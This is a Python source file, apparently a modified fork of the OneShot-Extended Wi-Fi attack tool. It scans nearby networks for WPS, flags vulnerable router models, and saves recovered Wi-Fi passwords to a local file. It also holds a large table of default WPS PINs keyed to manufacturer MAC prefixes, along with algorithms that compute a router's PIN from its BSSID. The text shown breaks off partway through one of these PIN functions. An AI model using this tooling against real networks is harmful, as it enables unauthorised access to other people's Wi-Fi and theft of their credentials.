

import codecs
import logging
import os
import re
import select
import socket
import string
import subprocess
import sys
import tempfile
import time
print("\033[38;2;233;213;2m[-]警告,版权归OneShot-Extended所有,本程序由HeYuXuan采用MIT协议进行二次修改\033[0m")
print("\033[38;2;0;153;255m" + r"""  _   _      __   __      __  __                    
 | | | |  ___\ \ / /_   _ \ \/ /_   _   ____  ____  
 | |_| | / _ \\ V /| | | | \  /| | | | / _  ▏|  _ \ 
 |  _  | ▏ __/ | | | |_| | /  \| |_| | ▏(_| ▏| | | |
 |_| |_| \___| |_|  \____|/_/\_\\____| \____▏|_| |_| """ + "\033[0m")

if sys.version_info < (3, 10):
    sys.exit('Python 3.10 or higher is required to run this script.')

from pathlib import Path
from shutil import which

def _resolve_user_home() -> str:

    override = os.environ.get('OSE_HOME')
    if override:
        return override.rstrip('/') or '/'

    home = str(Path.home())
    if home and home != '/':
        return home.rstrip('/')

    return os.path.dirname(os.path.abspath(__file__))

USER_HOME = _resolve_user_home()
SESSIONS_DIR = f'{USER_HOME}/.OneShot-Extended/sessions/'
PIXIEWPS_DIR = f'{USER_HOME}/.OneShot-Extended/pixiewps/'

INTERFACE_CANDIDATES = (
    'wlan0', 'wlan1', 'wlp0s20f3', 'wlp3s0', 'wlx00e04c000000'
)

_LOGGER = None

class _ColorFormatter(logging.Formatter):

    COLORS = {
        '[*]': '\033[0;32m',
        '[+]': '\033[1;32m',
        '[-]': '\033[1;33m',
        '[!]': '\033[1;31m',
        'RESET': '\033[0m'
    }

    LEVEL_PREFIXES = {
        logging.INFO: '[*]',
        logging.WARNING: '[-]',
        logging.ERROR: '[!]',
        logging.CRITICAL: '[!]',
    }

    def format(self, record):
        msg_str = str(record.msg)

        prefix = self.LEVEL_PREFIXES.get(record.levelno, '[*]')
        for pfx in ['[*]', '[+]', '[-]', '[!]']:
            if msg_str.startswith(pfx):
                prefix = pfx
                record.msg = msg_str[len(pfx):].lstrip()
                break

        color = self.COLORS.get(prefix, '')
        reset = self.COLORS['RESET']
        record.msg = f"{color}{prefix}{reset} {record.msg}"

        return super().format(record)

def _getLogger(name: str = __name__, level: int = logging.INFO) -> logging.Logger:

    logger = logging.getLogger(name)

    if not logger.handlers:
        logger.setLevel(level)

        handler = logging.StreamHandler(sys.stdout)
        handler.setLevel(level)

        formatter = _ColorFormatter(fmt='%(message)s')
        handler.setFormatter(formatter)

        logger.addHandler(handler)

    return logger

def initializeLogging():

    global _LOGGER

    _LOGGER = _getLogger('ose', logging.INFO)

def info(message: str):

    if _LOGGER is None:
        initializeLogging()

    _LOGGER.info(message)

def success(message: str):

    if _LOGGER is None:
        initializeLogging()

    _LOGGER.info('[+] %s', message)

def warning(message: str):

    if _LOGGER is None:
        initializeLogging()

    _LOGGER.warning(message)

def error(message: str):

    if _LOGGER is None:
        initializeLogging()

    _LOGGER.error(message)

def isAndroid():

    return bool(hasattr(sys, 'getandroidapilevel'))

def clearScreen():

    sys.stdout.write('\033[H\033[2J')
    sys.stdout.flush()

def die(text: str):

    sys.exit(f'[!] {text} \n')

def _run(cmd: list, timeout: int = 15):

    try:
        result = subprocess.run(cmd,
            encoding='utf-8', stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT, timeout=timeout
        )

        return result.returncode, result.stdout.strip()
    except (FileNotFoundError, subprocess.TimeoutExpired, OSError) as err:
        return 1, str(err)

def ifaceCtl(interface: str, action: str):

    command = ['ip', 'link', 'set', f'{interface}', f'{action}']

    try:
        command_output = subprocess.run(command,
            encoding='utf-8', stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT
        )
    except (subprocess.CalledProcessError, FileNotFoundError) as err:
        error(f'Can not control interface with ip link: \n {err}')
        return 1

    command_output_stripped = command_output.stdout.strip()

    if isAndroid() is False:
        def _rfKillUnblock():
            rfkill_command = ['rfkill', 'unblock', 'wifi']

            if not which(rfkill_command[0]):
                warning('rfkill utility is not available, unable to do anything')
                return

            try:
                subprocess.run(rfkill_command, check=True)
            except (subprocess.CalledProcessError, FileNotFoundError) as err:
                error(f'Failed to unblock interface, not continuing: \n {err}')

        if 'RF-kill' in command_output_stripped:
            warning('RF-kill is blocking the interface, unblocking')
            _rfKillUnblock()
            return

    if command_output.returncode != 0:
        error(command_output_stripped)

    return command_output.returncode

def isInterfaceUp(interface: str) -> bool:

    try:
        command = ['ip', 'link', 'show', interface]
        output = subprocess.run(command,
            encoding='utf-8', stdout=subprocess.PIPE,
            stderr=subprocess.PIPE, timeout=5
        )

        if output.returncode != 0:
            return False

        if 'UP' in output.stdout:
            return True

        return False

    except (OSError, subprocess.CalledProcessError, subprocess.TimeoutExpired):
        return False

def detectInterface() -> str | None:

    for candidate in INTERFACE_CANDIDATES:
        if os.path.exists(f'/sys/class/net/{candidate}'):
            return candidate

    net_dir = '/sys/class/net'

    try:
        for name in sorted(os.listdir(net_dir)):
            if os.path.isdir(f'{net_dir}/{name}/wireless'):
                return name
    except OSError:
        pass

    returncode, output = _run(['iw', 'dev'])

    if returncode == 0:
        for line in output.splitlines():
            match = re.match(r'\s*Interface (\S+)', line)
            if match:
                return match.group(1)

    return None

def _getProcessCommand(pid: int) -> str:

    try:
        with open(f'/proc/{pid}/cmdline', 'r', encoding='utf-8') as f:
            cmdline = f.read().replace('\0', ' ').strip()

            return cmdline
    except OSError:
        return ''

def _pixieRunPath(bssid: str) -> str:

    return f'''{PIXIEWPS_DIR}{bssid.replace(':', '').upper()}.run'''

class AndroidNetwork:

    
    
    
    SVC = '/system/bin/svc' if os.path.exists('/system/bin/svc') else 'svc'
    CMD = '/system/bin/cmd' if os.path.exists('/system/bin/cmd') else 'cmd'

    @staticmethod
    def _shell(args: list, timeout: int = 20):

        try:
            result = subprocess.run(args,
                encoding='utf-8', stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT, timeout=timeout
            )
        except (FileNotFoundError, subprocess.TimeoutExpired, OSError) as err:
            return False, str(err)

        output = (result.stdout or '').strip()

        return result.returncode == 0, output

    @staticmethod
    def _runSvc(args: list, timeout: int = 20):

        command = [AndroidNetwork.SVC] + args
        label = ' '.join(command)

        ok, output = AndroidNetwork._shell(command, timeout=timeout)
        if ok or os.geteuid() == 0:
            return ok, output, label

        su = which('su')
        if not su:
            return False, output, label

        ok_su, output_su = AndroidNetwork._shell(
            [su, '-c', label], timeout=timeout
        )

        return ok_su, (output_su or output), label

    def disableWifi(self, force_disable: bool = False, whisper: bool = False):

        if whisper is False:
            info('[*] Android: disabling Wi-Fi')

        ok, output, label = self._runSvc(['wifi', 'disable'])

        if not ok:
            warning(f'Android: \'{label}\' failed: {output or "no output"}')

        return ok

    def enableWifi(self, force_enable: bool = False, whisper: bool = False):

        if whisper is False:
            info('[*] Android: enabling Wi-Fi')

        ok, output, label = self._runSvc(['wifi', 'enable'])

        if not ok:
            warning(f'Android: \'{label}\' failed: {output or "no output"}')

        return ok

class CredentialStore:

    PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'wifipassword.txt')

    @staticmethod
    def read() -> list:

        pairs = []

        try:
            with open(CredentialStore.PATH, 'r', encoding='utf-8') as file:
                lines = [line.rstrip('\n') for line in file]
        except (FileNotFoundError, OSError):
            return pairs

        essid = None
        psk = None

        for raw in lines:
            line = raw.strip()

            if not line:
                if essid is not None and psk is not None:
                    pairs.append((essid, psk))
                    essid = None
                    psk = None
                continue

            if ':' not in line:
                continue

            
            key, _, value = line.partition(':')
            key = key.strip()
            value = value.strip()

            if '名称' in key or key.lower() in {'ssid', 'wifi', 'essid', 'wifi名称'}:
                essid = value
            elif '密码' in key or key.lower() in {'psk', 'password', 'pass', 'wifi密码'}:
                psk = value

        if essid is not None and psk is not None:
            pairs.append((essid, psk))

        return pairs

    @staticmethod
    def knownBssids() -> list:

        return [('<unknown>', essid) for essid, _psk in CredentialStore.read()]

    @staticmethod
    def isKnown(essid: str, psk: str) -> bool:

        target = ((essid or '').strip('\'"'), (psk or '').strip('\'"'))

        return target in CredentialStore.read()

    @staticmethod
    def append(bssid: str, essid: str, wps_pin: str, wpa_psk: str) -> bool:

        essid = (essid or '').strip('\'"')
        wpa_psk = (wpa_psk or '').strip('\'"')

        if CredentialStore.isKnown(essid, wpa_psk):
            return False

        fresh = (not os.path.exists(CredentialStore.PATH)
                 or os.path.getsize(CredentialStore.PATH) == 0)

        with open(CredentialStore.PATH, 'a', encoding='utf-8') as file:
            if not fresh:
                file.write('\n')

            file.write(f'wifi名称:{essid}\n')
            file.write(f'wifi密码:{wpa_psk}\n')

        return True

    @staticmethod
    def echo():

        if not os.path.exists(CredentialStore.PATH):
            info('No credentials stored yet')
            return

        returncode, output = _run(['cat', CredentialStore.PATH], timeout=10)

        if returncode == 0 and output:
            print(output)
        else:
            warning(f'Could not read {CredentialStore.PATH}')

class WiFiScanner:

    def __init__(self, interface: str):
        self.INTERFACE = interface

        self.STORED = CredentialStore.knownBssids()

    def scanTargets(self, attempts: int = 4) -> list:

        networks = None

        for attempt in range(1, attempts + 1):
            networks = self.iwScanner()

            if networks:
                break

            if attempt < attempts:
                pause = 2 * attempt
                warning(f'Scan attempt {attempt}/{attempts} came back empty — '
                        f'retrying in {pause}s')
                time.sleep(pause)

                
                
                ifaceCtl(self.INTERFACE, action='down')
                time.sleep(1)
                ifaceCtl(self.INTERFACE, action='up')
                time.sleep(pause)

        if not networks:
            error('No WPS networks found.')
            return []

        targets = [dict(network) for network in networks.values()]
        targets.sort(key=lambda entry: entry.get('Level', -100), reverse=True)

        return [(entry['BSSID'], entry) for entry in targets]

    def iwScanner(self) -> dict | bool:

        def handleNetwork(_line, result, networks):
            networks.append(
                {
                    'ESSID': '',
                    'Security type': 'Unknown',
                    'WPS': False,
                    'WPS version': '1.0',
                    'WPS locked': False,
                    'Model': '',
                    'Model number': '',
                    'Device name': ''
                }
            )
            networks[-1]['BSSID'] = result.group(1).upper()

        def handleEssid(_line, result, networks):
            try:
                d = result.group(1)
                essid = networks[-1]['ESSID'] = codecs.decode(d,'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

                networks[-1]['ESSID'] = essid if essid.strip('\x00 ') else '<hidden>'
            except (AttributeError, IndexError):
                networks[-1]['ESSID'] = '<hidden>'

        def handleLevel(_line, result, networks):
            networks[-1]['Level'] = int(float(result.group(1)))

        def handleSecurityType(_line, result, networks):
            sec = networks[-1]['Security type']
            if result.group(1) == 'capability':
                if 'Privacy' in result.group(2):
                    sec = 'WEP'
                else:
                    sec = 'Open'
            elif sec == 'WEP':
                if result.group(1) == 'RSN':
                    sec = 'WPA2'
                elif result.group(1) == 'WPA':
                    sec = 'WPA'
            elif sec == 'WPA':
                if result.group(1) == 'RSN':
                    sec = 'WPA/WPA2'
            elif sec == 'WPA2':
                if result.group(1) == 'PSK SAE':
                    sec = 'WPA2/WPA3'
                elif result.group(1) == 'WPA':
                    sec = 'WPA/WPA2'
            networks[-1]['Security type'] = sec

        def handleWps(_line, result, networks):
            networks[-1]['WPS'] = True

        def handleWpsVersion(_line, result, networks):
            wps_ver = networks[-1]['WPS version']

            wps_ver_filtered = result.group(1).replace('* Version2:', '')

            if wps_ver_filtered == '2.0':
                wps_ver = '2.0'

            networks[-1]['WPS version'] = wps_ver

        def handleWpsLocked(_line, result, networks):
            flag = int(result.group(1), 16)
            if flag:
                networks[-1]['WPS locked'] = True

        def handleModel(_line, result, networks):
            d = result.group(1)
            networks[-1]['Model'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handleModelNumber(_line: str, result: str, networks: list):
            d = result.group(1)
            networks[-1]['Model number'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handleDeviceName(_line, result, networks):
            d = result.group(1)
            networks[-1]['Device name'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        networks = []
        matchers = {
            re.compile(r'BSS (\S+)( )?\(on \w+\)'): handleNetwork,
            re.compile(r'SSID: (.*)'): handleEssid,
            re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'): handleLevel,
            re.compile(r'(capability): (.+)'): handleSecurityType,
            re.compile(r'(RSN):\t [*] Version: (\d+)'): handleSecurityType,
            re.compile(r'(WPA):\t [*] Version: (\d+)'): handleSecurityType,
            re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'): handleWps,
            re.compile(r' [*] Version2: (.+)'): handleWpsVersion,
            re.compile(r' [*] Authentication suites: (.+)'): handleSecurityType,
            re.compile(r' [*] AP setup locked: (0x[0-9]+)'): handleWpsLocked,
            re.compile(r' [*] Model: (.*)'): handleModel,
            re.compile(r' [*] Model Number: (.*)'): handleModelNumber,
            re.compile(r' [*] Device name: (.*)'): handleDeviceName
        }

        command = ['iw', 'dev', f'{self.INTERFACE}', 'scan']
        try:
            iw_scan_process = subprocess.run(command,
                encoding='utf-8', stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                timeout=60
            )
        except (subprocess.CalledProcessError, subprocess.TimeoutExpired, FileNotFoundError) as err:
            error(f'Failed to perform an iw scan: \n {err}')
            return False

        lines = iw_scan_process.stdout.splitlines()

        for line in lines:
            if line.startswith('command failed:'):
                reason = line.split('command failed:', 1)[1].strip()
                warning(f'iw scan refused by the driver: {reason}')
                return False

            line = line.strip('\t')

            for regexp, handler in matchers.items():
                res = re.match(regexp, line)
                if res:
                    handler(line, res, networks)

        networks = list(filter(lambda x: bool(x['WPS']), networks))

        if not networks:
            return False

        networks.sort(key=lambda x: x['Level'], reverse=True)

        network_list = {(i + 1): network for i, network in enumerate(networks)}

        self._printNetworkTable(network_list)

        return network_list

    def _printNetworkTable(self, network_list: dict):

        network_list_items = list(network_list.items())

        def truncateStr(s: str | None, length: int, postfix='…') -> str:

            if len(s) > length:
                k = length - len(postfix)
                s = s[:k] + postfix
            return s

        def colored(text: str, color: str) -> str:

            if color:
                if color == 'green':
                    text = f'\033[1m\033[92m{text}\033[00m'
                if color == 'dark_green':
                    text = f'\033[32m{text}\033[00m'
                elif color == 'red':
                    text = f'\033[1m\033[91m{text}\033[00m'
                elif color == 'yellow':
                    text = f'\033[1m\033[93m{text}\033[00m'
                else:
                    return text
            else:
                return text
            return text

        print('Network marks: {1} {0} {2} {0} {3} {0} {4}'.format(
            '|',
            colored('Vulnerable model', color='green'),
            colored('Vulnerable WPS ver.', color='dark_green'),
            colored('WPS locked', color='red'),
            colored('Already stored', color='yellow')
        ))

        def entryMaxLength(item: str, max_length=27) -> int:

            lengths = [len(entry[1].get(item, '')) for entry in network_list_items]
            return min(max(lengths), max_length) + 1

        columm_lengths = {
            '#': 4,
            'sec': entryMaxLength('Security type'),
            'bssid': 18,
            'essid': entryMaxLength('ESSID'),
            'name': entryMaxLength('Device name'),
            'model': entryMaxLength('Model')
        }

        row = '{:<{#}} {:<{bssid}} {:<{essid}} {:<{sec}} {:<{#}} {:<{#}} {:<{name}} {:<{model}}'

        print(row.format(
            '#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'Ver.', 'WSC name', 'WSC model',
            **columm_lengths
        ))

        for n, network in network_list_items:
            model = f'{network["Model"]} {network["Model number"]}'
            essid = truncateStr(network['ESSID'], 25)
            device_name = truncateStr(network['Device name'], 27)
            number = f'{n})'
            line = row.format(
                number, network['BSSID'], essid,
                network['Security type'], network['Level'],
                network['WPS version'], device_name, model,
                **columm_lengths
            )
            if (network['BSSID'], network['ESSID']) in self.STORED:
                print(colored(line, color='yellow'))
            elif network['WPS version'] == '1.0':
                print(colored(line, color='dark_green'))
            elif network['WPS locked']:
                print(colored(line, color='red'))
            else:
                print(line)

class WiFiCollector:

    @staticmethod
    def writeResult(bssid: str, essid: str, wps_pin: str, wpa_psk: str):

        if not CredentialStore.append(bssid, essid, wps_pin, wpa_psk):
            return info(f'[*] Credentials for {essid} ({bssid}) are already saved.')

        info(f'[*] Credentials saved to {CredentialStore.PATH}')

    @staticmethod
    def writePin(bssid: str, pin: str):

        filename = _pixieRunPath(bssid)

        with open(filename, 'w', encoding='utf-8') as file:
            file.write(pin)

        info(f'[*] PIN saved in {filename}')

class NetworkAddress:

    def __init__(self, mac):
        if isinstance(mac, int):
            self._INT_REPR = mac
            self._STR_REPR = self._int2mac(mac)
        elif isinstance(mac, str):
            self._STR_REPR = mac.replace('-', ':').replace('.', ':').upper()
            self._INT_REPR = self._mac2int(mac)

    @staticmethod
    def _mac2int(mac) -> int:
        return int(mac.replace(':', ''), 16)

    @staticmethod
    def _int2mac(mac) -> str:
        mac = hex(mac).split('x')[-1].upper()
        mac = mac.zfill(12)
        mac = ':'.join(mac[i: i + 2] for i in range(0, 12, 2))
        return mac

    @property
    def STRING(self):
        return self._STR_REPR

    @STRING.setter
    def STRING(self, value):
        self._STR_REPR = value
        self._INT_REPR = self._mac2int(value)

    @property
    def INTEGER(self):
        return self._INT_REPR

    @INTEGER.setter
    def INTEGER(self, value):
        self._INT_REPR = value
        self._STR_REPR = self._int2mac(value)

    def __int__(self):
        return self.INTEGER

    def __str__(self):
        return self.STRING

    def __iadd__(self, other):
        self.INTEGER += other

    def __isub__(self, other):
        self.INTEGER -= other

    def __eq__(self, other):
        return self.INTEGER == other.INTEGER

    def __ne__(self, other):
        return self.INTEGER != other.INTEGER

    def __lt__(self, other):
        return self.INTEGER < other.INTEGER

    def __gt__(self, other):
        return self.INTEGER > other.INTEGER

    def __repr__(self):
        return f'NetworkAddress(string={self._STR_REPR}, integer={self._INT_REPR})'

class WPSpin:

    def __init__(self):
        self.ALGO_MAC = 0
        self.ALGO_EMPTY = 1
        self.ALGO_STATIC = 2

        self.ALGOS = {'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self._pin24},
                      'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self._pin28},
                      'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self._pin32},
                      'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self._pinDLink},
                      'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self._pinDLink1},
                      'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self._pinASUS},
                      'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self._pinAirocon},
                      'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''},
                      'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
                      'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
                      'pinBrcm2': {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
                      'pinBrcm3': {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
                      'pinBrcm4': {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
                      'pinBrcm5': {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
                      'pinBrcm6': {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719},
                      'pinAirc1': {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203},
                      'pinAirc2': {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225},
                      'pinDSL2740R': {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554},
                      'pinRealtek1': {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
                      'pinRealtek2': {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911},
                      'pinRealtek3': {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
                      'pinUpvel': {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483},
                      'pinUR814AC': {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
                      'pinUR825AC': {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417},
                      'pinOnlime': {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604},
                      'pinEdimax': {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153},
                      'pinThomson': {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814},
                      'pinHG532x': {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
                      'pinH108L': {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
                      'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521}}

    def getLikely(self, bssid: str):

        res = self._getSuggestedList(bssid)
        if res:
            return res[0]

        return None

    @staticmethod
    def checksum(pin: int) -> int:

        accum = 0
        while pin:
            accum += (3 * (pin % 10))
            pin = int(pin / 10)
            accum += (pin % 10)
            pin = int(pin / 10)
        return (10 - accum % 10) % 10

    @staticmethod
    def _suggest(bssid: str) -> list:

        mac = bssid.replace(':', '').upper()
        algorithms = {
            'pin24': ('04BF6D', '0E5D4E', '107BEF', '14A9E3', '28285D', '2A285D', '32B2DC', '381766', '404A03', '4E5D4E', '5067F0', '5CF4AB', '6A285D', '8E5D4E', 'AA285D', 'B0B2DC', 'C86C87', 'CC5D4E', 'CE5D4E', 'EA285D', 'E243F6', 'EC43F6', 'EE43F6', 'F2B2DC', 'FCF528', 'FEF528', '4C9EFF', '0014D1', 'D8EB97', '1C7EE5', '84C9B2', 'FC7516', '14D64D', '9094E4', 'BCF685', 'C4A81D', '00664B', '087A4C', '14B968', '2008ED', '346BD3', '4CEDDE', '786A89', '88E3AB', 'D46E5C', 'E8CD2D', 'EC233D', 'ECCB30', 'F49FF3', '20CF30', '90E6BA', 'E0CB4E', 'D4BF7F4', 'F8C091', '001CDF', '002275', '08863B', '00B00C', '081075', 'C83A35', '0022F7', '001F1F', '00265B', '68B6CF', '788DF7', 'BC1401', '202BC1', '308730', '5C4CA9', '62233D', '623CE4', '623DFF', '6253D4', '62559C', '626BD3', '627D5E', '6296BF', '62A8E4', '62B686', '62C06F', '62C61F', '62C714', '62CBA8', '62CDBE', '62E87B', '6416F0', '6A1D67', '6A233D', '6A3DFF', '6A53D4', '6A559C', '6A6BD3', '6A96BF', '6A7D5E', '6AA8E4', '6AC06F', '6AC61F', '6AC714', '6ACBA8', '6ACDBE', '6AD15E', '6AD167', '721D67', '72233D', '723CE4', '723DFF', '7253D4', '72559C', '726BD3', '727D5E', '7296BF', '72A8E4', '72C06F', '72C61F', '72C714', '72CBA8', '72CDBE', '72D15E', '72E87B', '0026CE', '9897D1', 'E04136', 'B246FC', 'E24136', '00E020', '5CA39D', 'D86CE9', 'DC7144', '801F02', 'E47CF9', '000CF6', '00A026', 'A0F3C1', '647002', 'B0487A', 'F81A67', 'F8D111', '34BA9A', 'B4944E'),
            'pin28': ('200BC7', '4846FB', 'D46AA8', 'F84ABF'),
            'pin32': ('000726', 'D8FEE3', 'FC8B97', '1062EB', '1C5F2B', '48EE0C', '802689', '908D78', 'E8CC18', '2CAB25', '10BF48', '14DAE9', '3085A9', '50465D', '5404A6', 'C86000', 'F46D04', '3085A9', '801F02'),
            'pinDLink': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'A0AB1B', 'B8A386', 'C0A0BB', 'CCB255', 'FC7516', '0014D1', 'D8EB97'),
            'pinDLink1': ('0018E7', '00195B', '001CF0', '001E58', '002191', '0022B0', '002401', '00265A', '14D64D', '1C7EE5', '340804', '5CD998', '84C9B2', 'B8A386', 'C8BE19', 'C8D3A3', 'CCB255', '0014D1'),
            'pinASUS': ('049226', '04D9F5', '08606E', '0862669', '107B44', '10BF48', '10C37B', '14DDA9', '1C872C', '1CB72C', '2C56DC', '2CFDA1', '305A3A', '382C4A', '38D547', '40167E', '50465D', '54A050', '6045CB', '60A44C', '704D7B', '74D02B', '7824AF', '88D7F6', '9C5C8E', 'AC220B', 'AC9E17', 'B06EBF', 'BCEE7B', 'C860007', 'D017C2', 'D850E6', 'E03F49', 'F0795978', 'F832E4', '00072624', '0008A1D3', '00177C', '001EA6', '00304FB', '00E04C0', '048D38', '081077', '081078', '081079', '083E5D', '10FEED3C', '181E78', '1C4419', '2420C7', '247F20', '2CAB25', '3085A98C', '3C1E04', '40F201', '44E9DD', '48EE0C', '5464D9', '54B80A', '587BE906', '60D1AA21', '64517E', '64D954', '6C198F', '6C7220', '6CFDB9', '78D99FD', '7C2664', '803F5DF6', '84A423', '88A6C6', '8C10D4', '8C882B00', '904D4A', '907282', '90F65290', '94FBB2', 'A01B29', 'A0F3C1E', 'A8F7E00', 'ACA213', 'B85510', 'B8EE0E', 'BC3400', 'BC9680', 'C891F9', 'D00ED90', 'D084B0', 'D8FEE3', 'E4BEED', 'E894F6F6', 'EC1A5971', 'EC4C4D', 'F42853', 'F43E61', 'F46BEF', 'F8AB05', 'FC8B97', '7062B8', '78542E', 'C0A0BB8C', 'C412F5', 'C4A81D', 'E8CC18', 'EC2280', 'F8E903F4'),
            'pinAirocon': ('0007262F', '000B2B4A', '000EF4E7', '001333B', '00177C', '001AEF', '00E04BB3', '02101801', '0810734', '08107710', '1013EE0', '2CAB25C7', '788C54', '803F5DF6', '94FBB2', 'BC9680', 'F43E61', 'FC8B97'),
            'pinEmpty': ('E46F13', 'EC2280', '58D56E', '1062EB', '10BEF5', '1C5F2B', '802689', 'A0AB1B', '74DADA', '9CD643', '68A0F6', '0C96BF', '20F3A3', 'ACE215', 'C8D15E', '000E8F', 'D42122', '3C9872', '788102', '7894B4', 'D460E3', 'E06066', '004A77', '2C957F', '64136C', '74A78E', '88D274', '702E22', '74B57E', '789682', '7C3953', '8C68C8', 'D476EA', '344DEA', '38D82F', '54BE53', '709F2D', '94A7B7', '981333', 'CAA366', 'D0608C'),
            'pinCisco': ('001A2B', '00248C', '002618', '344DEB', '7071BC', 'E06995', 'E0CB4E', '7054F5'),
            'pinBrcm1': ('ACF1DF', 'BCF685', 'C8D3A3', '988B5D', '001AA9', '14144B', 'EC6264'),
            'pinBrcm2': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19'),
            'pinBrcm3': ('14D64D', '1C7EE5', '28107B', 'B8A386', 'BCF685', 'C8BE19', '7C034C'),
            'pinBrcm4': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm5': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm6': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinAirc1': ('181E78', '40F201', '44E9DD', 'D084B0'),
            'pinAirc2': ('84A423', '8C10D4', '88A6C6'),
            'pinDSL2740R': ('00265A', '1CBDB9', '340804', '5CD998', '84C9B2', 'FC7516'),
            'pinRealtek1': ('0014D1', '000C42', '000EE8'),
            'pinRealtek2': ('007263', 'E4BEED'),
            'pinRealtek3': ('08C6B3',),
            'pinUpvel': ('784476', 'D4BF7F0', 'F8C091'),
            'pinUR814AC': ('D4BF7F60',),
            'pinUR825AC': ('D4BF7F5',),
            'pinOnlime': ('D4BF7F', 'F8C091', '144D67', '784476', '0014D1'),
            'pinEdimax': ('801F02', '00E04C'),
            'pinThomson': ('002624', '4432C8', '88F7C7', 'CC03FA'),
            'pinHG532x': ('00664B', '086361', '087A4C', '0C96BF', '14B968', '2008ED', '2469A5', '346BD3', '786A89', '88E3AB', '9CC172', 'ACE215', 'D07AB5', 'CCA223', 'E8CD2D', 'F80113', 'F83DFF'),
            'pinH108L': ('4C09B4', '4CAC0A', '84742A4', '9CD24B', 'B075D5', 'C864C7', 'DC028E', 'FCC897'),
            'pinONO': ('5C353B', 'DC537C')
        }
        res = []
        for algo_id, masks in algorithms.items():
            if mac.startswith(masks):
                res.append(algo_id)

        return res

    @staticmethod
    def _pin24(bssid: str):
        return bssid.INTEGER & 0xFFFFFF

    @staticmethod
    def _pin28(bssid: str):
        return bssid.INTEGER & 0xFFFFFFF

    @staticmethod
    def _pin32(bssid: str):
        return bssid.INTEGER % 0x100000000

    @staticmethod
    def _pinDLink(bssid: str):
        nic = bssid.INTEGER & 0xFFFFFF
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) +
                ((pin & 0xF) << 8) +
                ((pin & 0xF) << 12) +
                ((pin & 0xF) << 16) +
                ((pin & 0xF) << 20))
        pin %= int(10e6)
        if pin < int(10e5):
            pin += ((pin % 9) * int(10e5)) + int(10e5)

        return pin

    @staticmethod
    def _pinASUS(bssid: str):
        b = [int(i, 16) for i in str(bssid).split(':')]
        pin = ''
        for i in range(7):
            pin += str((b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))

        return int(pin)

    @staticmethod
    def _pinAirocon(bssid: str):
        b = [int(i, 16) for i in str(bssid).split(':')]
        pin = ((b[0] + b[1]) % 10)\
        + (((b[5] + b[0]) % 10) * 10)\
        + (((b[4] + b[5]) % 10) * 100)\
        + (((b[3] + b[4]) % 10) * 1000)\
